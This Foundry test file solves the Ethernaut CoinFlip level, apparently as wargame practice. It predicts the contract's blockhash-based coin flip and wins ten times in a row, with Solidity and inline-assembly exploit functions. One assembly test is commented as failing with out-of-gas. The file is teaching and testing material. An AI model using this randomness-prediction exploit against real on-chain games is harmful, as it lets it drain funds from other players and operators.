// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {ICoinFlip} from "ethernaut/ICoinFlip.sol";
import {BaseTest} from "./BaseTest.t.sol";

// This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

contract CoinFlipTest is BaseTest {
    ICoinFlip public coinFlipInstance = ICoinFlip(0x64241C8638106C1C1eBF3cA89CF91714C492A064);
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; // From CoinFlip contract

    function setUp() public override {
        super.setUp();
    }

    function exploitSol() internal override {
        for (uint256 i; i < 10;) {
            uint256 _blockValue = uint256(blockhash(block.number - 1));
            uint256 _coinFlip = _blockValue / FACTOR;
            bool _side = _coinFlip == 1 ? true : false;
            coinFlipInstance.flip(_side);
            unchecked {
                ++i;
            }
            vm.roll(block.number + 1); // Move 1 block ahead so lastHash != blockValue
        }
    }

    function testExploitSol() public override {
        exploitSol();
        assertEq(coinFlipInstance.consecutiveWins(), 10);
    }

    function exploitYulLoopedInSol() internal {
        assembly {
            mstore(0, 0x1d263f67) //! mem[28:32] = 0x1d263f67 -> Signature for flip(bool)

            let _blockValue := blockhash(sub(number(), 1))
            let _guess := div(_blockValue, FACTOR)
            mstore(32, _guess)

            pop(call(gas(), sload(coinFlipInstance.slot), 0, 28, 36, 0, 0))
        }
    }

    function exploitYul() internal override {
        address _vmAddress = VM_ADDRESS;
        assembly {
            mstore(0, 0x1d263f67) //# mem[28:32] = 0x1d263f67 -> Signature for flip(bool)
            //         //# mem[32:64] = _side value
            mstore(64, 0x1f7b4f30) //# mem[64:96] = 0x1f7b4f30 -> Signature for roll(uint)
            for { let i := 0 } lt(i, 10) { i := add(i, 1) } {
                let _blockValue := blockhash(sub(number(), 1))
                let _guess := div(_blockValue, FACTOR)
                mstore(32, _guess)

                pop(call(gas(), sload(coinFlipInstance.slot), 0, 28, 36, 0, 0))
                mstore(96, add(number(), 2)) //# mem[96:108] = 2 -> Blocks to increase after every call to filp
                pop(call(gas(), _vmAddress, 0, 92, 36, 0, 0))
            }
        }
    }

    function testExploitYul() public override {
        exploitYul();
        // assertEq(coinFlipInstance.consecutiveWins(), 10); //! Fails due to [FAIL. Reason: EvmError: OutOfGas] testExploitYul() (gas: 9223372036854754743). Maybe an internal call, couldn't be found in trace.
    }

    function testExploitYulLoopedInSol() public {
        for (uint256 i; i < 10;) {
            exploitYulLoopedInSol();
            unchecked {
                ++i;
            }
            vm.roll(block.number + 1); // Move 1 block ahead so lastHash != blockValue
        }
        assertEq(coinFlipInstance.consecutiveWins(), 10);
    }
}
